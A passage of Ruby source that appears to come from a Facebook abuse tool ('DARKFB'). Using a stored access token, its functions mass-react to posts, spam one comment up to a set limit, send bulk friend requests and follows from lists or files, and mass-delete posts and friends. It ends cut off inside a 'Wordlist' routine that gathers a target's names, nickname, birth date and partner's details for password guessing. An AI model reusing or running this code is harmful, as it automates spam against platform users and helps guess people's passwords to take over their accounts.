    id = gets.chomp() ; id = id.tr(" ","")
    print ("\033[97m[+] Limit : ")
    limit = gets.to_i
    puts ("\033[97m[+] Loading")
    puts ("\033[97m═"*52)
    x = get('https://graph.facebook.com/' + id + '?fields=feed.limit(' + limit.to_s + ')&access_token=' + $token)
    y = JSON.parse(x)
    for z in y['feed']['data']
      y = z['id']
      begin
        p = Requests.post('https://graph.facebook.com/' + y + '/reactions?type=' + tipe + '&access_token=' + $token)
        puts ("\033[97m[\033[92m✓\033[97m] \033[92mSuccess \033[97m-> \033[96m%s \033[97m-> \033[93m%s" % [tipe, y])
        total += 1
      rescue 
        puts ("\033[97m[\033[93m!\033[97m] \033[91mFailed \033[97m-> \033[96m%s \033[97m-> \033[93m%s" % [tipe, y])
      rescue Interrupt
        puts ("\n")
        break
      end
    end
    puts ("\033[97m═"*52)
    puts ("\033[92m[✓] Finish "+ total.to_s)
    print ("\n\033[91m[\033[92mBack\033[91m] ")
    gets
    ReactPostMenu()
  rescue NoMethodError
    if y.include? ('id')
      puts ("\033[93m[!] No posts :(")
      print ("\n\033[91m[\033[92mBack\033[91m] ")
      gets
      ReactPostMenu()
    else
      puts ("\033[93m[!] User Not Found")
      print ("\n\033[91m[\033[92mBack\033[91m] ")
      gets
      ReactPostMenu()
    end
  end
end

def ReactPostRandom()
  begin
    total = 0
    tipe = ['LIKE','LOVE','HAHA','WOW','SAD','ANGRY']
    system('clear')
    puts ($logo)
    puts ("\033[97m═"*52)
    print ("\033[97m[+] Target Id : ")
    id = gets.chomp() ; id = id.tr(" ","")
    print ("\033[97m[+] Limit : ")
    limit = gets.to_i
    puts ("\033[97m[+] Loading")
    puts ("\033[97m═"*52)
    x = get('https://graph.facebook.com/' + id + '?fields=feed.limit(' + limit.to_s + ')&access_token=' + $token)
    y = JSON.parse(x)
    for z in y['feed']['data']
      y = z['id']
      reaksi = tipe.sample
      begin
        p = Requests.post('https://graph.facebook.com/' + y + '/reactions?type=' + reaksi + '&access_token=' + $token)
        puts ("\033[97m[\033[92m✓\033[97m] \033[92mSuccess \033[97m-> \033[96m%s \033[97m-> \033[93m%s" % [reaksi, y])
        total += 1
      rescue 
        puts ("\033[97m[\033[93m!\033[97m] \033[91mFailed \033[97m-> \033[96m%s \033[97m-> \033[93m%s" %[reaksi, y])
      rescue Interrupt
        puts ("\n")
        break
      end
    end
    puts ("\033[97m═"*52)
    puts ("\033[92m[✓] Finish "+ total.to_s)
    print ("\n\033[91m[\033[92mBack\033[91m] ")
    gets
    ReactPostMenu()
  rescue NoMethodError
    if y.include? ('id')
      puts ("\033[93m[!] No posts :(")
      print ("\n\033[91m[\033[92mBack\033[91m] ")
      gets
      ReactPostMenu()
    else
      puts ("\033[93m[!] User Not Found")
      print ("\n\033[91m[\033[92mBack\033[91m] ")
      gets
      ReactPostMenu()
    end
  end
end

def CommentPost()
  begin
    total = 0
    system ('clear')
    puts ($logo)
    puts ("\033[97m[!] Use <> For New Line")
    puts ("\033[97m═"*52)
    print ("\033[97m[+] Target Id : ")
    id = gets.chomp() ; id = id.tr(" ","")
    print ("\033[97m[+] Comment : ")
    body = gets.chomp()
    print ("\033[97m[+] Limit : ")
    limit = gets.to_i
    puts ("\033[97m[+] Loading....")
    puts ("\033[97m═"*52)
    body = body.tr("<>","\n")
    teks = ERB::Util.url_encode(body)
    a = get('https://graph.facebook.com/' + id + '?fields=feed.limit(' + limit.to_s + ')&access_token=' + $token)
    b = JSON.parse(a)
    for c in b['feed']['data']
      id = c['id']
      begin
        Requests.post("https://graph.facebook.com/%s/comments?message=%s&access_token=%s" % [id, teks, $token])
        puts ("\033[97m[\033[92m✓\033[97m] \033[92mSuccess \033[97m-> \033[96m%s... \033[97m-> \033[93m%s" % [body[0..10], id]) if body.length > 10
        puts ("\033[97m[\033[92m✓\033[97m] \033[92mSuccess \033[97m-> \033[96m%s \033[97m-> \033[93m%s" % [body, id]) if body.length <= 10
        total += 1
      rescue
        puts ("\033[97m[\033[93m!\033[97m] \033[91mFailed \033[97m-> \033[96m%s... \033[97m-> \033[93m%s" % [body[0..10], id]) if body.length > 10
        puts ("\033[97m[\033[93m!\033[97m] \033[91mFailed \033[97m-> \033[96m%s \033[97m-> \033[93m%s" % [body, id]) if body.length <= 10
      rescue Interrupt
        puts ("\n")
        break
      end
    end
    puts ("\033[97m═"*52)
    puts ("\033[92m[✓] Finish "+ total.to_s)
    print ("\n\033[91m[\033[92mBack\033[91m] ")
    gets
    CommentPostMenu()
  rescue NoMethodError
    if b.include? ('id')
      puts ("\033[93m[!] No posts :(")
      print ("\n\033[91m[\033[92mBack\033[91m] ")
      gets
      CommentPostMenu()
    else
      puts ("\033[93m[!] User Not Found")
      print ("\n\033[91m[\033[92mBack\033[91m] ")
      gets
      CommentPostMenu()
    end
  end
end

def ReactGruop()
   begin
    total = 0
    tipe = React()
    system('clear')
    puts ($logo)
    puts ("\033[97m═"*52)
    print ("\033[97m[+] Group Id : ")
    group = gets.chomp()
    print ("\033[97m[+] Limit : ")
    limit = gets.to_i
    puts ("\033[97m[!] CTRL + C TO STOP")
    puts ("\033[97m═"*52)
    a = get("https://graph.facebook.com/v3.0/%s?fields=feed.limit(%s)&access_token=%s" % [group,limit,$token])
    b = JSON.parse(a)
    for x in b['feed']['data']
      id = x['id']
      begin
        y = Requests.post("https://graph.facebook.com/%s/reactions?type=%s&access_token=%s" % [id,tipe,$token])
        puts ("\033[97m[\033[92m✓\033[97m] \033[92mSuccess \033[97m-> \033[96m%s \033[97m-> \033[93m%s" % [tipe,id])
        total += 1
      rescue
        puts ("\033[97m[\033[93m!\033[97m] \033[91mFailed \033[97m-> \033[96m%s \033[97m-> \033[93m%s" %[tipe, id])
      rescue Interrupt
        puts ("\n")
        break
      end
    end
    puts ("\033[97m═"*52)
    puts ("\033[92m[✓] Finish "+ total.to_s)
    print ("\n\033[91m[\033[92mBack\033[91m] ")
    gets
    ReactPostMenu()
  rescue NoMethodError
    if a.include? ('id')
      puts ("\033[93m[!] No posts :(")
      print ("\n\033[91m[\033[92mBack\033[91m] ")
      gets
      ReactPostMenu()
    else
      puts ("\033[93m[!] group Not Found")
      print ("\n\033[91m[\033[92mBack\033[91m] ")
      gets
      ReactPostMenu()
    end
  end
end

def ReactGruopRandom()
  begin
    total = 0
    tipe = ['LIKE','LOVE','HAHA','WOW','SAD','ANGRY']
    system('clear')
    puts ($logo)
    puts ("\033[97m═"*52)
    print ("\033[97m[+] Group id : ")
    id = gets.chomp() ; id = id.tr(" ","")
    print ("\033[97m[+] Limit : ")
    limit = gets.to_i
    puts ("\033[97m[!] CTRL + C TO STOP")
    puts ("\033[97m═"*52)
    x = get("https://graph.facebook.com/v3.0/%s?fields=feed.limit(%s)&access_token=%s" % [id,limit,$token])
    y = JSON.parse(x)
    for z in y['feed']['data']
      y = z['id']
      reaksi = tipe.sample
      begin
        Requests.post('https://graph.facebook.com/' + y + '/reactions?type=' + reaksi + '&access_token=' + $token)
        puts ("\033[97m[\033[92m✓\033[97m] \033[92mSuccess \033[97m-> \033[96m%s \033[97m-> \033[93m%s" % [reaksi, y])
        total += 1
      rescue 
        puts ("\033[97m[\033[93m!\033[97m] \033[91mFailed \033[97m-> \033[96m%s \033[97m-> \033[93m%s" %[reaksi, y])
      rescue Interrupt
        puts ("\n")
        break
      end
    end
    puts ("\033[97m═"*52)
    puts ("\033[92m[✓] Finish "+ total.to_s)
    print ("\n\033[91m[\033[92mBack\033[91m] ")
    gets
    ReactPostMenu()
  rescue NoMethodError
    if y.include? ('id')
      puts ("\033[93m[!] No posts :(")
      print ("\n\033[91m[\033[92mBack\033[91m] ")
      gets
      ReactPostMenu()
    else
      puts ("\033[93m[!] Group Not Found")
      print ("\n\033[91m[\033[92mBack\033[91m] ")
      gets
      ReactPostMenu()
    end
  end
end

def CommentGroup()
  begin
    total = 0
    system ('clear')
    puts ($logo)
    puts ("\033[97m[!] Use <> For New Line")
    puts ("\033[97m═"*52)
    print ("\033[97m[+] Group Id : ")
    id = gets.chomp() ; id = id.tr(" ","")
    print ("\033[97m[+] Comment : ")
    body = gets.chomp()
    print ("\033[97m[+] Limit : ")
    limit = gets.to_i
    body = body.tr("<>","\n")
    teks = ERB::Util.url_encode(body)
    a = get('https://graph.facebook.com/group/?id=' + id + '&access_token=' + $token)
    b = JSON.parse(a)
    puts ("\033[97m[✓] Group : "+b['name'])
    puts ("\033[97m[!] CTRL + C TO STOP")
    puts ("\033[97m═"*52)
    c = get('https://graph.facebook.com/v3.0/' + id + '?fields=feed.limit(' + limit.to_s + ')&access_token=' + $token)
    d = JSON.parse(c)
    for e in d['feed']['data']
      begin
        Requests.post('https://graph.facebook.com/' + e['id'] + '/comments?message=' + teks + '&access_token=' + $token)
        puts ("\033[97m[\033[92m✓\033[97m] \033[92mSuccess \033[97m-> \033[96m%s... \033[97m-> \033[93m%s" % [body[0..10], e['id']]) if body.length > 10
        puts ("\033[97m[\033[92m✓\033[97m] \033[92mSuccess \033[97m-> \033[96m%s \033[97m-> \033[93m%s" % [body, e['id']]) if body.length <= 10
        total += 1
      rescue
        puts ("\033[97m[\033[93m!\033[97m] \033[91mFailed \033[97m-> \033[96m%s... \033[97m-> \033[93m%s" % [body[0..10], e['id']]) if body.length > 10
        puts ("\033[97m[\033[93m!\033[97m] \033[91mFailed \033[97m-> \033[96m%s \033[97m-> \033[93m%s" % [body, id]) if body.length <= 10
      rescue Interrupt
        puts ("\n")
        break
      end
    end
    puts ("\033[97m═"*52)
    puts ("\033[92m[✓] Finish "+ total.to_s)
    print ("\n\033[91m[\033[92mBack\033[91m] ")
    gets
    CommentPostMenu()
  rescue NoMethodError, TypeError
    if b.include? ('id')
      puts ("\033[93m[!] No posts :(")
      print ("\n\033[91m[\033[92mBack\033[91m] ")
      gets
      CommentPostMenu()
    else
      puts ("\033[93m[!] Group Not Found")
      print ("\n\033[91m[\033[92mBack\033[91m] ")
      gets
      CommentPostMenu()
    end
  end
end

def AddTarget()
  system('clear')
  puts ($logo)
  puts ("\033[97m═"*52)
  print ("\033[97m[+] Target Id : ")
  id = gets.chomp() ; id = id.tr(" ","")
  a = get('https://graph.facebook.com/' + id + '?access_token=' + $token)
  b = JSON.parse(a)
  if b.include? ('name')
    puts ("\033[92m[+] Target : "+b['name'])
    puts ("\033[97m[+] Loading...")
    puts ("\033[97m═"*52)
    begin
      Requests.post('https://graph.facebook.com/me/friends/' + b['id'] + '?access_token=' + $token)
      puts ("\033[92m[✓] Name : "+b['name'])
      puts ("\033[92m[✓] Status : Success")
      print ("\n\033[91m[\033[92mBack\033[91m] ")
      gets
      AddFriendMenu()
    rescue
      puts ("\033[92m[✓] Name :"+b['name'])
      puts ("\033[92m[✓] Status : Failed")
      print ("\n\033[91m[\033[92mBack\033[91m] ")
      gets
      AddFriendMenu()
    end
  elsif b.include? ('error') and b['error']['code'] == 190
    abort ("\033[93m[!] "+b['error']['message'])
  else
    puts("\033[93m[!] Users Not Found")
    print ("\n\033[91m[\033[92mBack\033[91m] ")
    gets
    AddFriendMenu()
  end
end

def AddFriends()
  begin
    total = 0
    system("clear")
    puts ($logo)
    puts ("\033[97m═"*52)
    print ("\033[97m[+] Friend Id : ")
    id = gets.chomp() ; id = id.tr(" ","")
    print ("\033[97m[+] Limit : ")
    limit = gets.to_i
    a = get('https://graph.facebook.com/' + id + '?access_token=' + $token)
    b = JSON.parse(a)
    if b.include? ("name")
      tik("\033[97m[+] From "+b['name'])
      puts ("\033[97m[!] CTRL + C TO STOP")
      puts ("\033[97m═"*52)
      a = get('https://graph.facebook.com/%s?fields=friends.limit(%d)&access_token=%s' % [id,limit,$token])
      b = JSON.parse(a)
      for c in b['friends']['data']
        id = c['id']
        begin
          Requests.post('https://graph.facebook.com/me/friends/' + id + '?access_token=' + $token)
          puts ("\033[97m[\033[92m✓\033[97m] \033[92mSuccess : \033[96m%s --> \033[93m%s" % [c['name'],id])
          total += 1
        rescue
         puts ("\033[97m[\033[91m!\033[97m] \033[91mFailed  : \033[96m%s --> \033[93m%s" % [c['name'],id])
        rescue Interrupt
          puts ("\n")
          break
        end
      end
      puts ("\033[97m═"*52)
      puts ("\033[92m[✓] Finish "+ total.to_s)
      print ("\n\033[91m[\033[92mBack\033[91m] ")
      gets
      AddFriendMenu()
    else
      puts ("\033[93m[!] User Not Found")
      print ("\n\033[91m[\033[92mBack\033[91m] ")
      gets
      AddFriendMenu()
    end
  rescue NoMethodError
    puts ("\033[93m[+] There are no friends on the account")
    print ("\n\033[91m[\033[92mBack\033[91m] ")
    gets
    AddFriendMenu()
  end
end


def AddFile()
  total = 0
  system('clear')
  puts ($logo)
  puts ("\033[97m═"*52)
  print ("\033[97m[+] File Id : ")
  file = gets.chomp()
  print ("\033[97m[+] Limit : ")
  limit = gets.to_i
  if File.file? (file)
    files = File.readlines(file, chomp: true)
    puts ("\033[97m[!] CTRL + C TO STOP")
    puts ("\033[97m═"*52)
    for id in files[0...limit]
      begin
        a = get('https://graph.facebook.com/' + id + '?access_token=' + $token)
        b = JSON.parse(a)
        c = Requests.post('https://graph.facebook.com/me/friends/' + b['id'] + '?access_token=' + $token)
        puts ("\033[97m[\033[92m✓\033[97m] \033[92mSuccess : \033[96m%s --> \033[93m%s" % [b['name'], b['id']])
        total += 1
      rescue TypeError
        puts ("\033[97m[\033[91m!\033[97m] \033[91mNot Found -> "+id)
      rescue
        puts ("\033[97m[\033[91m!\033[97m] \033[91mFailed  : \033[96m%s --> \033[93m%s" % [b['name'], b['id']])
      rescue Interrupt
        puts ("\n")
        break
      end
    end
    puts ("\033[97m═"*52)
    puts ("\033[92m[✓] Finish "+ total.to_s)
    print ("\n\033[91m[\033[92mBack\033[91m] ")
    gets
    AddFriendMenu()
  else
    puts ("\033[93m[+] File Not Found")
    print ("\n\033[91m[\033[92mBack\033[91m] ")
    gets
    AddFriendMenu()
  end
end

def SpamComment()
  total = 0
  system("clear")
  puts ($logo)
  puts ("\033[97m[!] Use <> For New Line")
  puts ("\033[97m═"*52)
  print ("\033[97m[+] Post Id : ")
  id = gets.chomp() ; id = id.tr(" ","")
  a = get("https://graph.facebook.com/#{id}?access_token=#{$token}")
  b = JSON.parse(a)
  if not b.key? ('from')
    puts ("\033[93m[!] Post Not Found")
  else
    puts ("\033[97m[+] Posted By #{b['from']['name']}")
    print ("\033[97m[+] Comment : ")
    body = gets.chomp()
    msg = body.tr("<>","\n")
    print ("\033[97m[+] Limit   : ")
    limit = gets.to_i
    data = {"message"=>msg,"access_token"=>$token}
    url = URI("https://graph.facebook.com/#{id}/comments")
    puts ("\033[97m═"*52)
    limit.times do |i|
      req = Net::HTTP.post_form(url,data)
      res = JSON.parse(req.body)
      if res.key? ('id')
        total += 1
        puts ("\033[92m[✓] Success : #{body} -> #{id}") if body.length <= 10
        puts ("\033[92m[✓] Success : #{body[0...8]...} -> #{id}") if body.length > 10
      else
        puts ("\033[93m[!] Failed  : #{body} -> #{id}") if body.length <= 10
        puts ("\033[93m[!] Failed  : #{body[0...8]} -> #{id}") if body.length > 10
      end
    end
    puts ("\033[97m═"*52)
    puts ("\033[92m[✓] Finish "+ total.to_s)
    print ("\n\033[91m[\033[92mBack\033[91m] ")
    gets
    CommentPostMenu()
  end
end

def FolowTarget()
  system('clear')
  puts ($logo)
  puts ("\033[97m═"*52)
  print ("\033[97m[+] Target Id : ")
  id = gets.chomp() ; id = id.tr(" ","")
  a = get('https://graph.facebook.com/' + id + '?access_token=' + $token)
  b = JSON.parse(a)
  if b.include? ('name')
    puts ("\033[97m[+] Target : "+b['name'])
    puts ("\033[97m[+] Loading...")
    puts ("\033[97m═"*52)
    begin
      x =Requests.post('https://graph.facebook.com/' + b['id'] + '/subscribers?access_token=' + $token)
      puts ("\033[92m[✓] Name   : "+b['name'])
      puts ("\033[92m[✓] Status : Success")
      print ("\n\033[91m[\033[92mBack\033[91m] ")
      gets
      FollowMenu()
    rescue
      puts ("\033[92m[✓] Name   : "+b['name'])
      puts ("\033[92m[✓] Status : Failed")
      print ("\n\033[91m[\033[92mBack\033[91m] ")
      gets
      FollowMenu()
    end
  elsif b.include? ('error') and b['error']['code'] == 190
    abort ("\033[93[!] "+b['error']['message'])
  else
    puts("\033[93m[!] Users Not Found")
    print ("\n\033[91m[\033[92mBack\033[91m] ")
    gets
    FollowMenu()
  end
end

def FolowAll()
  total = 0
  system('clear')
  puts ($logo)
  puts ("\033[97m═"*52)
  puts ("\033[97m[+] Pleace Wait")
  x = get("https://graph.facebook.com/me/friends?access_token="+$token)
  y = JSON.parse(x)
  abort ("\033[93m[!] InValid Access Token") if y.include? ('error')
  puts ("\033[97m[!] CTRL + C TO STOP")
  puts ("\033[97m═"*52)
  for x in y['data']
    name = x['name']
    id = x['id']
    begin
      Requests.post('https://graph.facebook.com/' + id + '/subscribers?access_token=' + $token)
      puts ("\033[97m[\033[92m✓\033[97m] \033[92mSuccess : \033[96m%s --> \033[93m%s" % [name,id])
      total += 1
    rescue
      puts ("\033[97m[\033[91m!\033[97m] \033[91mFailed  : \033[96m%s --> \033[93m%s" % [name,id])
    rescue Interrupt
      puts("\n")
      break
    end
  end
  puts ("\033[97m═"*52)
  puts ("\033[92m[✓] Finish "+ total.to_s)
  print ("\n\033[91m[\033[92mBack\033[91m] ")
  gets
  FollowMenu()
end

def FolowFromFriend()
  begin
    total = 0
    system('clear')
    puts ($logo)
    puts ("\033[97m═"*52)
    print ("\033[97m[+] Friend Id : ")
    id = gets.chomp() ; id = id.tr(" ","")
    print ("\033[97m[+] Limit : ")
    limit = gets.to_i
    a = get('https://graph.facebook.com/' + id + '?access_token=' + $token)
    b = JSON.parse(a)
    if b.include? ("name")
      tik("\033[97m[+] From "+b['name'])
      puts ("\033[97m[!] CTRL + C TO STOP")
      puts ("\033[97m═"*52)
      a = get('https://graph.facebook.com/%s?fields=friends.limit(%d)&access_token=%s' % [id,limit,$token])
      b = JSON.parse(a)
      for c in b['friends']['data']
        id = c['id']
        begin
          Requests.post('https://graph.facebook.com/me/friends/' + id + '?access_token=' + $token)
          puts ("\033[97m[\033[92m✓\033[97m] \033[92mSuccess : \033[96m%s --> \033[93m%s" % [c['name'],id])
          total += 1
        rescue
          puts ("\033[97m[\033[91m!\033[97m] \033[91mFailed  : \033[96m%s --> \033[93m%s" % [c['name'],id])
        rescue Interrupt
          puts ("\n")
          break
        end
      end
      puts ("\033[97m═"*52)
      puts ("\033[92m[✓] Finish "+ total.to_s)
      print ("\n\033[91m[\033[92mBack\033[91m] ")
      gets
      FollowMenu()
    else
      puts ("\033[93m[!] User Not Found")
      print ("\n\033[91m[\033[92mBack\033[91m] ")
      gets
      FollowMenu()
    end
  rescue NoMethodError
    puts ("\033[93m[+] There are no friends on the account")
    print ("\n\033[91m[\033[92mBack\033[91m] ")
    gets
    FollowMenu()
  end
end

def FolowFromFile()
  total = 0
  system('clear')
  puts ($logo)
  puts ("\033[97m═"*52)
  print ("\033[97m[+] File Id : ")
  file = gets.chomp()
  print ("\033[97m[+] Limit : ")
  limit = gets.to_i
  if File.file? (file)
    files = File.readlines(file, chomp: true)
    puts ("\033[97m[!] CTRL + C TO STOP")
    puts ("\033[97m═"*52)
    for id in files[0...limit]
      begin
        a = get('https://graph.facebook.com/' + id + '?access_token=' + $token)
        b = JSON.parse(a)
        Requests.post('https://graph.facebook.com/' + id + '/subscribers?access_token=' + $token)
        puts ("\033[97m[\033[92m✓\033[97m] \033[92mSuccess : \033[96m%s --> \033[93m%s" % [b['name'], b['id']])
        total += 1
      rescue TypeError
        puts ("\033[97m[\033[91m!\033[97m] \033[91mNot Found -> "+id)
      rescue
        puts ("\033[97m[\033[91m!\033[97m] \033[91mFailed  : \033[96m%s --> \033[93m%s" % [b['name'], b['id']])
      rescue Interrupt
        puts ("\n")
        break
      end
    end
    puts ("\033[97m═"*52)
    puts ("\033[92m[✓] Finish "+ total.to_s)
    print ("\n\033[91m[\033[92mBack\033[91m] ")
    gets
    FollowMenu()
  else
    puts ("\033[93m[+] File Not Found")
    print ("\n\033[91m[\033[92mBack\033[91m] ")
    gets
    FollowMenu()
  end
end

def DeleteAllPost()
  total = 0
  system('clear')
  puts($logo)
  puts ("\033[97m═"*52)
  puts ("\033[97m[+] From "+$name)
  puts ("\033[97m[+] CTRL + C TO STOP")
  puts ("\033[97m[+] START..")
  puts ("\033[97m═"*52)
  a = get('https://graph.facebook.com/me/feed?access_token=' + $token)
  b = JSON.parse(a)
  for post in b['data']
    id = post['id']
    begin
     c = get('https://graph.facebook.com/' + id + '?method=delete&access_token=' + $token)
     d = JSON.parse(c)
     puts ("\033[97m[\033[92m✓\033[97m] \033[92mSuccess : "+id)
     total += 1
    rescue
     puts ("\033[97m[\033[91m!\033[97m] \033[91mFailed : "+id)
    rescue Interrupt
      puts ("\n")
      break
    end
  end
  puts ("\033[97m═"*52)
  puts ("\033[92m[✓] Finish "+ total.to_s)
  print ("\n\033[91m[\033[92mBack\033[91m] ")
  gets
  Bot()
end

def Unfriend()
  begin
    hitung = 0
    system('clear')
    puts ($logo)
    puts ("\033[97m═"*52)
    puts ("\033[97m[+] From "+$name)
    x = get ("https://graph.facebook.com/me/friends?access_token="+$token)
    y = JSON.parse(x)
    total = y['data'].each{|i| i['id']}
    puts ("\033[97m[+] Total Friend : "+total.length.to_s)
    puts ("\033[97m[+] CTRL + C TO STOP")
    puts ("\033[97m[+] START")
    puts ("\033[97m═"*52)
    for x in y['data']
      name = x['name']
      id = x['id'].to_s
      begin
        Requests.delete('https://graph.facebook.com/me/friends?uid=' + id + '&access_token=' + $token)
        hitung += 1
        puts ("\033[97m[\033[92m✓\033[97m] \033[92mSuccess \033[97m: \033[93m"+name+" \033[97m--> \033[96m"+id)
      rescue
        puts ("\033[97m[\033[91m!\033[97m] \033[91mFailed \033[97m: \033[93m"+name+" \033[97m--> \033[96m"+id)
      end
    end
    puts ("\033[97m═"*52)
    puts ("\033[92m[✓] Finish "+ hitung.to_s)
    print ("\n\033[91m[\033[92mBack\033[91m] ")
    gets
    Bot()
  rescue NoMethodError
    puts ("\033[93m[+] Your Account Has No Friends")
    print ("\n\033[91m[\033[92mBack\033[91m] ")
    gets
    Bot()
  end
end

def unfollow()
  begin
    jadi = 0
    system('clear')
    puts ($logo)
    puts ("\033[97m═"*52)
    puts ("\033[97m[+] From "+$name)
    a = get("https://graph.facebook.com/me/subscribedto?limit=#{$limits}&access_token=#{$token}")
    b = JSON.parse(a)
    total = b['data'].each{|i| i['id']}
    puts ("\033[97m[+] Total Id "+total.length.to_s)
    puts ("\033[97m[+] CTRL + C TO STOP")
    puts ("\033[97m[+] START")
    puts ("\033[97m═"*52)
    for x in b['data']
      name = x['name']
      id = x['id']
      begin
        Requests.post('https://graph.facebook.com/' + id + '/subscribers?method=delete&access_token=' + $token)
        puts ("\033[97m[\033[92m✓\033[97m] \033[92mSuccess : \033[96m%s --> \033[93m%s" % [name,id])
        jadi += 1
      rescue
        puts ("\033[97m[\033[91m!\033[97m] \033[91mFailed  : \033[96m%s --> \033[93m%s" % [name,id])
      rescue Interrupt
        puts ("\n")
        break
      end
    end
    puts ("\033[97m═"*52)
    puts ("\033[92m[✓] Finish "+ jadi.to_s)
    print ("\n\033[91m[\033[92mBack\033[91m] ")
    gets
    Bot()
  rescue
    puts ("\033[93m[!] There is an error")
    print ("\n\033[91m[\033[92mBack\033[91m] ")
    gets
    Bot()
  end
end

def lain()
  system('clear')
  puts ($logo)
  puts ("\033[97m═"*52)
  puts ("\033[97m║-> \x1b[1;37;40m1. Write Status")
  puts ("\033[97m║-> \x1b[1;37;40m2  Write Timeline")
  puts ("\033[97m║-> \x1b[1;37;40m3. Create Wordlist")
  puts ("\033[97m║-> \x1b[1;37;40m4. Account Checker")
  puts ("\033[97m║-> \x1b[1;37;40m5. List of Groups")
  puts ("\033[97m║-> \x1b[1;37;40m6. Access Token")
  puts ("\033[97m║-> \x1b[1;37;40m7. Frofil Guard")
  puts ("\033[97m║-> \x1b[1;37;40m8. Download Video")
  puts ("\033[97m║-> \x1b[1;37;40m9. Fanpage")
  puts ("\033[97m║-> \x1b[1;32;40m0. Back")
  puts ("\x1b[1;37;40m║")
  print ("╚═\x1b[1;91m▶\x1b[1;97m ")
  mana = gets.chomp()
  if mana == '1' or mana == '01'
    WriteStatus()
  elsif mana == '2' or mana == '02'
    WriteTimeline()
  elsif mana == '3' or mana == '03'
    Wordlist()
  elsif mana == '4' or mana == '04'
    AccountCheck()
  elsif mana == '5' or mana == '05'
    Mygroup()
    print ("\n\033[91m[\033[92mBack\033[91m] ")
    gets
    lain()
  elsif mana == '6' or mana == '06'
    AksesToken()
  elsif mana == '7' or mana == '07'
    GuardMenu()
  elsif mana == '8' or mana == '08'
    DownloadVideo()
  elsif mana == '9' or mana == '09'
    Fanpage()
  elsif mana == '0' or mana == '00'
    menu()
  else
    puts ("\033[93m[!] Invalid Input")
    sleep(0.9)
    lain()
  end
end

def DownloadVideo()
  system('clear')
  puts ($logo)
  puts ("\033[97m═"*52)
  print ("\033[97m[+] Video Id : ")
  id = gets.chomp() ; id = id.tr(" ","")
  puts ("\033[97m[+] Loading...")
  a = get("https://graph.facebook.com/v10.0/#{id}?fields=source,length,from&access_token=#{$token}")
  b = JSON.parse(a)
  save = "DARKFB-#{id}.mp4"
  if b.key? ("source")
    mp4 = File.open(save,'wb')
    puts ("\033[97m[+] Downloading Video From #{b['from']['name']}")
    data = get(b['source'])
    mp4.write(data)
    mp4.close
    size = File.size(save)
    size = convert_bytes(size)
    durasi = Time.at(b['length']).utc.strftime("%H:%M:%S")
    puts ("\033[92m[✓] Download Complete")
    puts ("\033[92m[✓] File Name : #{File.basename(save)}")
    puts ("\033[92m[✓] File Size : #{size}")
    puts ("\033[92m[✓] File Path : #{File.realpath(save)}")
    puts ("\033[92m[✓] Duration  : #{durasi}")
    abort ("\033[91m[!] Exit")
  else
    puts ("\033[93m[!] Invalid Video Id")
    print ("\n\033[91m[\033[92mBack\033[91m] ")
    gets
    lain()
  end
end
    
  
def WriteStatus()
  system('clear')
  puts ($logo)
  puts ("\033[97m[!] Use <> For New Line")
  puts ("\033[97m═"*52)
  print ("\033[97m[+] Message : ")
  body = gets.chomp()
  body = body.tr("<>","\n")
  teks = ERB::Util.url_encode(body)
  begin
    x = get('https://graph.facebook.com/me/feed?method=POST&message=' + teks + '&access_token=' + $token)
    y = JSON.parse(x)
    puts ("\033[97m[\033[92m✓\033[97m] Success : "+y['id'])
    print ("\n\033[91m[\033[92mBack\033[91m] ")
    gets
    lain()
  rescue
    puts ("\033[97m[\033[91m!\033[97m] Failed  : nil")
    print ("\n\033[91m[\033[92mBack\033[91m] ")
    gets
    lain()
  end
end

def WriteTimeline()
  system('clear')
  puts ($logo)
  puts ("\033[97m[!] Use <> For New Line")
  puts ("\033[97m═"*52)
  print ("\033[97m[+] Friend Id : ")
  id = gets.chomp() ; id = id.tr(" ","")
  a = get("https://graph.facebook.com/me/friends?access_token="+$token)
  b = JSON.parse(a)
  b = b['data'].map {|i| i['id']}
  print ("\033[97m[+] Message : ")
  body = gets.chomp()
  body = body.tr("<>","\n")
  teks = ERB::Util.url_encode(body)
  x = get('https://graph.facebook.com/' + id + '?access_token=' + $token)
  y = JSON.parse(x)
  if y.include? ("name") and b.include? (id)
    begin
      x = get('https://graph.facebook.com/' + id + '/feed?method=POST&message=' + teks + '&access_token=' + $token)
      y = JSON.parse(x)
      puts ("\033[97m[\033[92m✓\033[97m] Success : "+y['id'])
      print ("\n\033[91m[\033[92mBack\033[91m] ")
      gets
      lain()
    rescue
      puts ("\033[97m[\033[91m!\033[97m] Failed : nil")
      print ("\n\033[91m[\033[92mBack\033[91m] ")
      gets
      lain()
    end
  else
    puts ("\033[93m[!] Friends Not Found")
    print ("\n\033[91m[\033[92mBack\033[91m] ")
    gets
    lain()
  end
end

def Wordlist()
  begin
    system ('clear')
    puts ($logo)
    puts ("\033[97m═"*52)
    print ("\033[97m[+] First Name : ")
    a = gets.chomp()
    print ("\033[97m[+] Middle Name : ")
    b = gets.chomp()
    print ("\033[97m[+] Last Name : ")
    c = gets.chomp()
    print ("\033[97m[+] Nick Name : ")
    d = gets.chomp()
    print ("\033[97m[+] Date of birth (DDMMYY) : ")
    e = gets.chomp()
    f = e[0...2]
    g = e[2...4]
    h = e[4...]
    puts ("\033[97m═"*52)
    puts ("\033[97m[!] SKIP IF TARGET SINGLES")
    print ("\033[97m[+] Girlfriend Name : ")
    i = gets.chomp()
    print ("\033[97m[+] Girlfriend Nickname : ")
    j = gets.chomp()
    print ("\033[97m[+] Date of birth (DDMMYY) : ")
    k = gets.chomp()
    l = k[0...2]
    m = k[2...4]
    n = k[4...]
